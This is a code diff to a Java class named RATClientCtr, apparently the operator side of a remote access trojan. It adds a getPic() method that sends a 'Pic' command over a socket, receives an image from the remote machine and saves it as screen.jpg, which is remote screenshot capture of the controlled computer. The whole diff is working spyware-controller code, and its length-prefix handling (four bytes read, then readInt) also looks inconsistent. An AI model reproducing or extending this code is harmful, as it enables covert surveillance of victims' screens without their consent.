@@ -1,13 +1,18 @@
 package controllers;
 
+import java.awt.image.BufferedImage;
+import java.io.ByteArrayInputStream;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
+import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.ObjectInputStream;
 import java.io.OutputStream;
 import java.net.Socket;
+import java.nio.ByteBuffer;
 import java.util.ArrayList;
+import javax.imageio.ImageIO;
 
 /**
  *
@@ -106,6 +111,29 @@ public class RATClientCtr {
         DataOutputStream dos = new DataOutputStream(ops);
         dos.writeUTF(command);
         dos.flush();
+    }
+    
+    public static void getPic() throws IOException {
+        String command = "Pic";
+        OutputStream ops = mySocket.getOutputStream();
+        DataOutputStream dos = new DataOutputStream(ops);
+        dos.writeUTF(command);
+        dos.flush();
+        try {
+            DataInputStream dis = new DataInputStream(mySocket.getInputStream());
+            byte[] sizeAr = new byte[4];
+            dis.read(sizeAr);
+            int size = dis.readInt();
+            
+            byte[] imageAr = new byte[size];
+            dis.readFully(imageAr);
+            
+            BufferedImage image = ImageIO.read(new ByteArrayInputStream(imageAr));
+            ImageIO.write(image, "jpg", new File("screen.jpg"));
+            
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
     }
 
 }
